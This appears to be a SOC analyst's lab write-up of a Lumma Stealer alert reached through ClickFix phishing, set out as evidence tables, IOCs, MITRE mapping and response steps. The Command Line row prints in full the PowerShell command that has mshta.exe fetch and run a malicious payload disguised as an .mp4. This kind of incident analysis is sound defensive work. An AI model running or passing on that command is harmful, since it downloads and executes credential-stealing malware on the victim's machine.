# 1. Alert Overview

| Field                      | Details                                                              |
| -------------------------- | -------------------------------------------------------------------- |
| Alert Name                 | <br>SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing |
| Severity                   | critical                                                             |
| Event ID                   | <br>316                                                              |
| Alert Type                 | Phishing / Data Leakage                                              |
| Source address / Host      | <br>update@windows-update.site                                       |
| Destination address / Host | dylan@letsdefend.io                                                  |
| Target Service             | SMTP Address :132.232.40.201                                         |
| Timestamp                  | Mar, 13, 2025, 09:44 AM                                              |

![[Pasted image 20260702170233.png]]
---

# 2. Initial Assessment

**Main Question:**  
Is this activity normal or suspicious. Why?
yes, The sender email look suspicious also the email message is written creating the urgency with some suspicious link and even while searching the link  in virus total it flagged as a malicious.

![[{BD27EEA9-AB56-465B-AF5B-9056EF9D146C}.png]]

| Question                                                                                                                  | Answer                                                                                                              |
| ------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| What activity triggered the alert, and which user, host, or IP is involved?                                               | The powershell command the victim was tricked to copy and paste into his computer. , The malicious link he browsed. |
| Is this activity expected or unusual for this user, host, or service?                                                     | Its unsual                                                                                                          |
| Is there any sign of malicious activity, such as external IP, suspicious command, file creation, or known attack pattern? | yes                                                                                                                 |


**Initial Finding:**
I found the Dylan user has clicked the malicious link 
![[{95CCF9AB-5E8D-46A3-8390-A2790B74347F}.png]]

The malicious powershell command was executed in the victims pc looking at the command we can see  its downloading  and executing the lumma stealer **from** `overcoatpassably[.]shop` disguised as a video file  using mhsta which is responsible for running hta (html + jscript) applications. in windows.

![[{EEBDA195-4744-4B6A-B34C-1AD60EF89355}.png]]
---

# 3. Investigation Steps

## A. Endpoint Evidence

| Area Checked               | Finding                                                                                                                                                                                                                                                                                                                                                                      |     |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- |
| Process Tree               | User clicked phishing link or clipboard hijack happened<br>   └── PowerShell ran obfuscated command<br>        └── mshta.exe opened malicious URL<br>             └── mshta spawned PowerShell<br>                  └── conhost.exe started<br>                       └── Lumma Stealer ran in memory<br>                            └── Connected to attacker C2 over HTTPS |     |
| Parent Process             | powershell.exe                                                                                                                                                                                                                                                                                                                                                               |     |
| Command Line               | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "mshta.exe https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4"                                                                                                                                                                                                                                      |     |
| File Created or Downloaded | maloy.mp4                                                                                                                                                                                                                                                                                                                                                                    |     |

---

## B. Network Evidence

| Area Checked           | Finding                                                     |
| ---------------------- | ----------------------------------------------------------- |
| Source and Destination | 132.232.40.201, 172.16.17.216                               |
| Target URL / Endpoint  | https://windows-update.site/                                |
| Request Method         | GET                                                         |
| External IP / Domain   | https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4      |
| Data Transferred       | hostname, OS version, hardware details. Browser detials etc |


---

# 4. Indicators of Compromise

| IOC Type         | Notes                                                            |
| ---------------- | ---------------------------------------------------------------- |
| Domain / URL     | https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4           |
| File Name / Path | maloy.mp4                                                        |
| File Hash        | 15c80b5be235bf2a8c38291eb697a702c07dde087eb459e9ea46a2bee17c5f03 |
| Process Name     | mshta.exe                                                        |
| User Account     | Dylan                                                            |

---

# 5. MITRE ATT&CK Mapping

| Tactic          | Technique                       | Technique ID | Short Explanation                                       |
| --------------- | ------------------------------- | ------------ | ------------------------------------------------------- |
| Initial Access  | phishing Link                   | T1566        | User clicked malicious link or copied hijacked command. |
| Execution       | Powershell                      | T1059.001    | Obfuscated PowerShell command was executed.             |
| Defense Evasion | Obfuscated Files or Information | T1027        | Command was obfuscated to hide real activity.           |
![[{59A67B32-8EF9-46B1-8270-B2E90472B968}.png]]

---

# 6. Impact Assessment

| Impact Area                         | Status / Details                                                                                                                                                                      |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Was access successful?              | yes                                                                                                                                                                                   |
| Was command execution seen?         | yes                                                                                                                                                                                   |
| Was any file created or downloaded? | yes                                                                                                                                                                                   |
| Was any sensitive data exposed?     | yes                                                                                                                                                                                   |
| Is the host compromised?            | yes                                                                                                                                                                                   |
| Business Impact                     | Lumma Stealer can cause data breach, compliance fines, legal issues, financial loss, and reputation damage. It may also disrupt business operation during investigation and recovery. |

---

# 7. Final Verdict

**True Positive — Malicious Traffic**

This alert is confirmed malicious. It shows Lumma Stealer execution through ClickFix phishing and DLL side-loading technique.

This confirms Dylan host compromise and requires urgent containment.


---

# 8. Recommended Actions

| Action Type | Action                                                                            |
| ----------- | --------------------------------------------------------------------------------- |
| Containment | Isolate infected host from network immediately.                                   |
| Eradication | Isolate infected host from network immediately.                                   |
| Recovery    | Reset user passwords, revoke active sessions, and restore clean system if needed. |
| Monitoring  | Monitor outbound HTTPS traffic, new PowerShell activity, and C2 indicators.       |
| Extra Notes | Check browser cookies, saved passwords, and token theft possibility.              |
